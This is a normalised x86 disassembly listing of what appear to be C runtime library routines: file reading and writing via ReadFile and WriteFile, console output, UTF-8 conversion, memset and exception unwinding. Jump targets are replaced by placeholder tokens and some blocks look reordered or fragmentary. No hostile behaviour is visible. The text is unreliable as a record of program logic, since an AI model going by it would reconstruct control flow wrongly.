call sub_200d008
jmp r-xdata
sub_2006fe0
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_2002d91
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_2006f50
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_2007042
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_2007072
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push 0x0
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_20070a3
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
cmp esi edi
jne r-xdata
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
call sub_20047ce
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_2004766
add esp 0x14
jmp r-xdata
or eax 0xffffffff
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
or eax 0x1
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
push esi
call sub_200bc76
pop ecx
jmp r-xdata
neg eax
sbb eax eax
and eax 0x10
add eax 0x10
or [ esi + 0xc ] eax
mov [ esi + 0x4 ] edi
cmp eax 0xffffffff
je r-xdata
push [ esi + 0x18 ]
push [ esi + 0x8 ]
push esi
call sub_200788d
pop ecx
push eax
call sub_2007790
add esp 0xc
mov [ esi + 0x4 ] eax
cmp eax edi
je r-xdata
test [ esi + 0xc ] 0x82
jne r-xdata
cmp [ esi + 0x18 ] 0x200
jne r-xdata
push esi
call sub_200788d
pop ecx
cmp eax 0xffffffff
je r-xdata
mov ecx [ esi ]
dec [ esi + 0x4 ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
mov eax [ esi + 0xc ]
test al 0x8
je r-xdata
mov eax rw-data
push esi
call sub_200788d
pop ecx
cmp eax 0xfffffffe
je r-xdata
pop edi
pop esi
pop ebp
retn
test eax 0x400
jne r-xdata
or [ esi + 0xc ] 0x2000
push esi
call sub_200788d
sar eax 0x5
push esi
lea edi [ eax * 4 + rw-data ]
call sub_200788d
and eax 0x1f
pop ecx
shl eax 0x6
add eax [ edi ]
pop ecx
jmp r-xdata
mov [ esi + 0x18 ] 0x1000
mov al [ eax + 0x4 ]
and al 0x82
cmp al 0x82
jne r-xdata
sub_20071ce
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
mov edx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push 0xfffffffe
pop eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x1c ] edx
cmp esi eax
jne r-xdata
push ebx
xor ebx ebx
cmp esi ebx
jl r-xdata
call sub_20047e1
and [ eax ] 0x0
call sub_20047ce
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
call sub_20047e1
mov [ eax ] ebx
call sub_20047ce
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x9
call sub_2004766
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp esi [ rw-data ]
jb r-xdata
pop esi
leave
retn
pop ebx
mov eax esi
sar eax 0x5
push edi
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
and esi 0x1f
shl esi 0x6
add eax esi
mov cl [ eax + 0x4 ]
test cl 0x1
jne r-xdata
cmp edx 0x7fffffff
ja r-xdata
call sub_20047e1
mov [ eax ] ebx
call sub_20047ce
mov [ eax ] 0x9
jmp r-xdata
call sub_20047e1
mov [ eax ] ebx
call sub_20047ce
mov [ eax ] 0x16
mov [ ebp - 0x10 ] ebx
cmp edx ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_2004766
add esp 0x14
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
test cl 0x2
jne r-xdata
pop edi
cmp [ ebp + 0xc ] ebx
je r-xdata
mov al [ eax + 0x24 ]
add al al
sar al 0x1
mov [ ebp - 0x2 ] al
movsx eax al
dec eax
push 0x4
pop ecx
je r-xdata
mov eax edx
not eax
test al 0x1
jne r-xdata
dec eax
jne r-xdata
mov eax edx
shr eax 0x1
mov [ ebp + 0x10 ] ecx
cmp eax ecx
jb r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax edx
not eax
test al 0x1
je r-xdata
push [ ebp + 0x10 ]
call sub_200b534
pop ecx
mov [ ebp - 0xc ] eax
cmp eax ebx
jne r-xdata
mov [ ebp + 0x10 ] eax
mov ecx [ edi ]
add ecx esi
test [ ecx + 0x4 ] 0x48
je r-xdata
and edx 0xfffffffe
mov [ ebp + 0x10 ] edx
push 0x1
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_200bad8
mov ecx [ edi ]
mov [ esi + ecx + 0x28 ] eax
mov eax [ ebp - 0xc ]
add esp 0x10
mov [ esi + ecx + 0x2c ] edx
call sub_20047ce
mov [ eax ] 0xc
call sub_20047e1
mov [ eax ] 0x8
push ebx
lea ecx [ ebp - 0x18 ]
push ecx
push [ ebp + 0x10 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov cl [ ecx + 0x5 ]
cmp cl 0xa
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop esi
cmp eax esi
jne r-xdata
mov ecx [ ebp - 0x18 ]
cmp ecx ebx
jl r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp eax 0x6d
jne r-xdata
call sub_20047ce
mov [ eax ] 0x9
call sub_20047e1
mov [ eax ] esi
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
ja r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x1
mov [ esi + ecx + 0x5 ] 0xa
cmp [ ebp - 0x2 ] bl
je r-xdata
push eax
call sub_20047f4
pop ecx
mov [ ebp - 0x14 ] ebx
jmp r-xdata
or [ ebp - 0x14 ] 0xffffffff
mov eax [ edi ]
add [ ebp - 0x10 ] ecx
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x80
je r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x25 ]
cmp cl 0xa
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax 0xfffffffe
jne r-xdata
push eax
call sub_20016b0
pop ecx
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0xc ]
je r-xdata
cmp [ ebp - 0x2 ] 0x2
je r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov eax [ ebp - 0x10 ]
jmp r-xdata
cmp ecx ebx
je r-xdata
cmp ecx ebx
je r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0x10 ] 0x2
mov [ esi + ecx + 0x25 ] 0xa
jne r-xdata
and [ eax ] 0xfb
mov ecx [ ebp - 0xc ]
cmp [ ecx ] 0xa
jne r-xdata
and [ eax ] 0xfb
mov ecx [ ebp - 0xc ]
cmp [ ecx ] 0xa
jne r-xdata
mov ecx [ edi ]
mov cl [ esi + ecx + 0x26 ]
cmp cl 0xa
je r-xdata
sub ebx [ ebp - 0xc ]
mov [ ebp - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x10 ]
movzx ecx [ eax ]
cmp cx 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
mov eax ebx
sub eax [ ebp - 0xc ]
cmp [ ebp - 0x2 ] 0x1
mov [ ebp - 0x10 ] eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ecx ]
cmp al 0x1a
je r-xdata
or [ eax ] 0x4
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
je r-xdata
mov ecx [ edi ]
lea esi [ esi + ecx + 0x4 ]
test [ esi ] 0x40
jne r-xdata
cmp cx 0xd
je r-xdata
mov ebx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0x10 ] eax
cmp ebx eax
jae r-xdata
test eax eax
je r-xdata
mov eax [ edi ]
lea eax [ esi + eax + 0x4 ]
test [ eax ] 0x40
jne r-xdata
cmp al 0xd
je r-xdata
mov ebx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
add eax ebx
mov [ ebp + 0x10 ] ebx
mov [ ebp - 0x10 ] eax
cmp ebx eax
jae r-xdata
mov [ eax ] cl
mov ecx [ edi ]
inc eax
dec [ ebp + 0x10 ]
mov [ ebp - 0x10 ] 0x3
mov [ esi + ecx + 0x26 ] 0xa
mov ax [ eax ]
mov [ ebx ] ax
inc ebx
inc ebx
or [ esi ] 0x2
jmp r-xdata
mov ecx [ ebp - 0x10 ]
add ecx 0xfffffffe
cmp eax ecx
jae r-xdata
mov [ ebx ] cx
inc ebx
inc ebx
inc eax
inc eax
mov [ ebp + 0x10 ] eax
jmp r-xdata
dec ebx
mov cl [ ebx ]
test cl cl
js r-xdata
mov al [ ecx ]
mov [ ebx ] al
inc ebx
or [ eax ] 0x2
jmp r-xdata
mov eax [ ebp - 0x10 ]
dec eax
cmp ecx eax
jae r-xdata
mov [ ebx ] al
inc ebx
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add [ ebp + 0x10 ] 0x2
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x2
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea ecx [ eax + 0x2 ]
cmp [ ecx ] 0xa
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
xor eax eax
inc eax
movzx ecx cl
jmp r-xdata
inc ebx
jmp r-xdata
inc [ ebp + 0x10 ]
push 0x0
lea eax [ ebp - 0x18 ]
push eax
push 0x1
lea eax [ ebp - 0x1 ]
push eax
mov eax [ edi ]
push [ esi + eax ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea eax [ ecx + 0x1 ]
cmp [ eax ] 0xa
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ ebp + 0x10 ] eax
jb r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add eax 0x4
mov [ ebp + 0x10 ] eax
jmp r-xdata
cmp [ ecx + rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
sub ebx [ ebp - 0xc ]
shr eax 0x1
push eax
push [ ebp + 0xc ]
push ebx
push [ ebp - 0xc ]
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x10 ] eax
test eax eax
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ ebp + 0x10 ] eax
jmp r-xdata
inc ecx
inc ecx
mov [ ebp + 0x10 ] ecx
jmp r-xdata
push 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
pop eax
mov [ ebx ] ax
cmp eax 0x4
jg r-xdata
mov dl [ ebx ]
movzx ecx dl
movsx ecx [ ecx + rw-data ]
test ecx ecx
jne r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ edi ]
xor ecx ecx
cmp eax ebx
setne cl
add eax eax
mov [ ebp - 0x10 ] eax
mov [ esi + edx + 0x30 ] ecx
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebx ] 0xd
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x48
je r-xdata
inc ebx
cmp ebx [ ebp - 0xc ]
jne r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp ebx [ ebp - 0xc ]
jb r-xdata
inc ecx
cmp ecx eax
jne r-xdata
call sub_20047ce
mov [ eax ] 0x2a
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jne r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
push 0x1
push 0xffffffff
push 0xfffffffe
push [ ebp + 0x8 ]
call sub_200bad8
add esp 0x10
cmp [ ebp - 0x8 ] 0xa
je r-xdata
cmp [ ebp - 0x8 ] 0xa
je r-xdata
push 0xa
jmp r-xdata
push 0xd
pop eax
mov [ ebx ] ax
mov eax [ edi ]
mov cl [ ebp - 0x8 ]
mov [ esi + eax + 0x5 ] cl
mov eax [ edi ]
mov cl [ ebp - 0x7 ]
mov [ esi + eax + 0x25 ] cl
mov eax [ edi ]
mov [ esi + eax + 0x26 ] 0xa
jmp r-xdata
dec ebx
movzx ecx [ ebx ]
inc eax
mov ecx [ edi ]
add ecx esi
test [ ecx + 0x4 ] 0x48
je r-xdata
add ebx eax
jmp r-xdata
push 0x1
push 0xffffffff
push 0xffffffff
push [ ebp + 0x8 ]
call sub_200bad8
add esp 0x10
cmp [ ebp - 0x1 ] 0xa
je r-xdata
cmp [ ebp - 0x1 ] 0xa
je r-xdata
mov [ ebx ] 0xa
jmp r-xdata
mov [ ebx ] 0xd
mov eax [ edi ]
mov cl [ ebp - 0x1 ]
mov [ esi + eax + 0x5 ] cl
jmp r-xdata
inc ebx
inc ebx
neg eax
cdq
push 0x1
push edx
push eax
push [ ebp + 0x8 ]
call sub_200bad8
add esp 0x10
inc ebx
cmp eax 0x2
mov [ ecx + 0x5 ] dl
jl r-xdata
cmp eax 0x3
jne r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x25 ] dl
inc ebx
sub ebx eax
jmp r-xdata
mov dl [ ebx ]
mov ecx [ edi ]
mov [ esi + ecx + 0x26 ] dl
inc ebx
sub_2007790
push 0x10
push r--data
call sub_200625c
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor esi esi
cmp eax esi
jl r-xdata
call sub_20047e1
and [ eax ] 0x0
call sub_20047ce
mov [ eax ] 0x9
call sub_20047e1
mov [ eax ] esi
call sub_20047ce
mov [ eax ] 0x9
cmp eax [ rw-data ]
jb r-xdata
call sub_20062a1
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov edi eax
and edi 0x1f
shl edi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + edi + 0x4 ]
and ecx 0x1
je r-xdata
mov ecx 0x7fffffff
cmp ecx [ ebp + 0x10 ]
sbb ecx ecx
inc ecx
jne r-xdata
push eax
call sub_200d189
pop ecx
mov [ ebp - 0x4 ] esi
mov eax [ ebx ]
test [ eax + edi + 0x4 ] 0x1
je r-xdata
call sub_20047e1
mov [ eax ] esi
call sub_20047ce
mov [ eax ] 0x16
jmp r-xdata
call sub_20047ce
mov [ eax ] 0x9
call sub_20047e1
mov [ eax ] esi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_20071ce
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_2004766
add esp 0x14
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_2007883
mov eax [ ebp - 0x1c ]
sub_200788d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov eax [ eax + 0x10 ]
call sub_20047ce
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_2004766
add esp 0x14
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
sub_20078bf
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
push edi
xor edi edi
cmp esi edi
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x10 ] edi
je r-xdata
call sub_20047ce
push 0x16
pop esi
mov [ eax ] esi
pop edi
pop esi
pop ebp
retn
push [ ebp + 0xc ]
push edi
push [ ebp + 0x8 ]
call sub_2007940
add esp 0xc
cmp [ ebp + 0x10 ] edi
je r-xdata
cmp [ ebp + 0xc ] esi
jb r-xdata
cmp [ ebp + 0xc ] esi
jae r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_20081d0
add esp 0xc
jmp r-xdata
push 0x16
pop eax
call sub_20047ce
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_2004766
add esp 0x14
mov eax esi
jmp r-xdata
sub_2007940
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x100
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_200d441
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_20079ba
mov edi edi
push ebp
mov ebp esp
mov eax 0x1ae4
call sub_200d790
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
xor esi esi
mov [ ebp - 0x1acc ] eax
mov [ ebp - 0x1ac8 ] esi
mov [ ebp - 0x1ad0 ] esi
cmp [ ebp + 0x10 ] esi
jne r-xdata
cmp eax esi
jne r-xdata
xor eax eax
jmp r-xdata
push ebx
push edi
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
lea esi [ eax * 4 + rw-data ]
mov eax [ esi ]
and edi 0x1f
shl edi 0x6
add eax edi
mov bl [ eax + 0x24 ]
add bl bl
sar bl 0x1
mov [ ebp - 0x1ad8 ] esi
mov [ ebp - 0x1ad9 ] bl
cmp bl 0x2
je r-xdata
call sub_20047e1
mov [ eax ] esi
call sub_20047ce
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_2004766
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_2002d91
leave
retn
mov ecx [ ebp + 0x10 ]
not ecx
test cl 0x1
jne r-xdata
cmp bl 0x1
jne r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
call sub_20047e1
xor esi esi
mov [ eax ] esi
call sub_20047ce
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_2004766
add esp 0x14
jmp r-xdata
push [ ebp + 0x8 ]
call sub_200bcbf
pop ecx
test eax eax
je r-xdata
push 0x2
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_200bad8
add esp 0x10
or eax 0xffffffff
jmp r-xdata
xor ecx ecx
mov eax [ esi ]
test [ edi + eax + 0x4 ] 0x80
je r-xdata
pop edi
pop ebx
push 0x0
lea ecx [ ebp - 0x1ad4 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp - 0x1acc ]
push [ eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac0 ] ecx
test bl bl
jne r-xdata
call sub_2004244
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0x14 ] ecx
lea eax [ ebp - 0x1ae4 ]
sete cl
push eax
mov eax [ esi ]
push [ edi + eax ]
mov [ ebp - 0x1ae0 ] ecx
call [ GetConsoleMode@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1ac0 ] eax
mov eax [ ebp - 0x1ad4 ]
and [ ebp - 0x1ac0 ] 0x0
mov [ ebp - 0x1ac8 ] eax
jmp r-xdata
mov [ ebp - 0x1abc ] eax
cmp bl 0x2
jne r-xdata
mov [ ebp - 0x1ac4 ] eax
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
xor ecx ecx
cmp [ ebp - 0x1ae0 ] ecx
je r-xdata
mov eax [ ebp - 0x1ac8 ]
sub eax [ ebp - 0x1ad0 ]
cmp [ ebp - 0x1ac0 ] 0x0
je r-xdata
cmp [ ebp - 0x1ac8 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ esi ]
test [ edi + eax + 0x4 ] 0x40
je r-xdata
jmp r-xdata
call [ GetConsoleCP@IAT ]
mov ebx [ ebp - 0x1acc ]
mov [ ebp - 0x1ae4 ] eax
xor eax eax
mov [ ebp - 0x1ac4 ] eax
cmp [ ebp + 0x10 ] eax
jbe r-xdata
test bl bl
je r-xdata
mov esi [ ebp - 0x1ad8 ]
push 0x5
pop esi
cmp [ ebp - 0x1ac0 ] esi
jne r-xdata
mov ecx [ ebp - 0x1abc ]
and [ ebp - 0x1ac4 ] 0x0
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x6b8 ]
pop esi
jmp r-xdata
call sub_20047ce
mov [ eax ] 0x1c
call sub_20047e1
and [ eax ] 0x0
mov eax [ ebp - 0x1acc ]
cmp [ eax ] 0x1a
jne r-xdata
mov ecx [ ebp - 0x1ac4 ]
and [ ebp - 0x1abc ] 0x0
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
mov [ ebp - 0x1abc ] eax
mov eax [ esi ]
add eax edi
test [ eax + 0x4 ] 0x80
je r-xdata
push [ ebp - 0x1ac0 ]
call sub_20047f4
pop ecx
jmp r-xdata
call sub_20047ce
mov [ eax ] 0x9
call sub_20047e1
mov [ eax ] esi
jmp r-xdata
xor esi esi
push esi
push esi
push 0xd55
lea ecx [ ebp - 0x1410 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
mov edx [ ebp - 0x1abc ]
movzx edx [ edx ]
add [ ebp - 0x1abc ] esi
add ecx esi
cmp dx 0xa
jne r-xdata
mov ecx [ ebp - 0x1abc ]
and [ ebp - 0x1ac4 ] 0x0
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
xor eax eax
jmp r-xdata
mov ebx eax
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ esi ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x1ac4 ]
inc [ ebp - 0x1ac4 ]
mov dl [ edx ]
inc ecx
cmp dl 0xa
jne r-xdata
cmp al 0x1
je r-xdata
mov cl [ ebx ]
mov esi [ ebp - 0x1ad8 ]
xor eax eax
cmp cl 0xa
sete al
mov [ ebp - 0x1ae0 ] eax
mov eax [ esi ]
add eax edi
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
mov eax ebx
sub eax esi
push eax
lea eax [ ebp + esi - 0x1410 ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
add [ ebp - 0x1ac4 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac4 ] 0x6a8
jb r-xdata
push 0xd
pop ebx
mov [ eax ] bx
add eax esi
add [ ebp - 0x1ac4 ] esi
mov ebx eax
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ esi ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x1abc ]
add [ ebp - 0x1abc ] 0x2
movzx edx [ edx ]
inc ecx
inc ecx
cmp dx 0xa
jne r-xdata
mov eax [ ebp - 0x1ad4 ]
add [ ebp - 0x1ac8 ] eax
cmp eax ebx
jl r-xdata
mov [ eax ] dl
inc eax
inc [ ebp - 0x1abc ]
cmp [ ebp - 0x1abc ] 0x13ff
jb r-xdata
inc [ ebp - 0x1ad0 ]
mov [ eax ] 0xd
inc eax
inc [ ebp - 0x1abc ]
movzx esi [ ebx ]
xor ecx ecx
cmp si 0xa
sete cl
inc ebx
inc ebx
add [ ebp - 0x1abc ] 0x2
mov [ ebp - 0x1ac0 ] esi
mov [ ebp - 0x1ae0 ] ecx
cmp al 0x2
jne r-xdata
movsx eax cl
push eax
call sub_2008977
pop ecx
test eax eax
je r-xdata
mov dl [ eax + 0x34 ]
mov [ ebp - 0xc ] dl
mov [ ebp - 0xb ] cl
and [ eax + 0x38 ] 0x0
push 0x2
lea eax [ ebp - 0xc ]
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1ac0 ] eax
add esi [ ebp - 0x1ad4 ]
cmp ebx esi
jg r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov eax [ ebp - 0x1ad4 ]
add [ ebp - 0x1ac8 ] eax
cmp eax ebx
jl r-xdata
add [ ebp - 0x1ac4 ] 0x2
mov [ eax ] dx
inc eax
inc eax
cmp [ ebp - 0x1ac4 ] 0x13fe
jb r-xdata
add [ ebp - 0x1ad0 ] 0x2
push 0xd
pop ebx
mov [ eax ] bx
inc eax
inc eax
add [ ebp - 0x1ac4 ] 0x2
mov eax [ ebp - 0x1ac4 ]
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
push [ ebp - 0x1ac0 ]
call sub_200d58f
pop ecx
cmp ax [ ebp - 0x1ac0 ]
jne r-xdata
cmp al 0x2
jne r-xdata
cmp al 0x1
je r-xdata
push 0x1
push ebx
mov ecx [ ebp - 0x1acc ]
sub ecx ebx
add ecx [ ebp + 0x10 ]
xor eax eax
inc eax
cmp ecx eax
jbe r-xdata
lea eax [ ebp - 0x1ac0 ]
push eax
call sub_200d76b
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x1abc ]
sub eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac8 ] eax
cmp eax [ ebp + 0x10 ]
jb r-xdata
jmp r-xdata
mov eax [ ebp - 0x1abc ]
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov esi [ ebp - 0x1ad8 ]
jmp r-xdata
add [ ebp - 0x1ac8 ] 0x2
cmp [ ebp - 0x1ae0 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
cmp [ ebp - 0x1abc ] eax
jb r-xdata
xor eax eax
push eax
push eax
push 0x5
lea ecx [ ebp - 0xc ]
push ecx
push 0x1
lea ecx [ ebp - 0x1ac0 ]
push ecx
push eax
push [ ebp - 0x1ae4 ]
inc ebx
inc [ ebp - 0x1abc ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ esi ]
mov dl [ ebx ]
inc [ ebp - 0x1ac8 ]
mov [ edi + ecx + 0x34 ] dl
mov ecx [ esi ]
mov [ edi + ecx + 0x38 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x1ac0 ]
push ebx
push eax
call sub_200d76b
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
cmp ebx esi
jg r-xdata
mov esi [ ebp - 0x1ad8 ]
jmp r-xdata
push 0xd
pop eax
push eax
mov [ ebp - 0x1ac0 ] eax
call sub_200d58f
pop ecx
cmp ax [ ebp - 0x1ac0 ]
jne r-xdata
mov al [ ebp - 0x1ad9 ]
test al al
jne r-xdata
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1ac4 ]
push eax
push esi
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc ebx
inc [ ebp - 0x1abc ]
jmp r-xdata
inc [ ebp - 0x1ac8 ]
inc [ ebp - 0x1ad0 ]
mov eax [ ebp - 0x1abc ]
mov ecx [ ebp - 0x1ad0 ]
add eax ecx
cmp [ ebp - 0x1ac4 ] esi
mov [ ebp - 0x1ac8 ] eax
jl r-xdata
cmp [ ebp - 0x1ae0 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ac4 ]
push eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] 0xd
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ac4 ] 0x1
jl r-xdata
inc [ ebp - 0x1ad0 ]
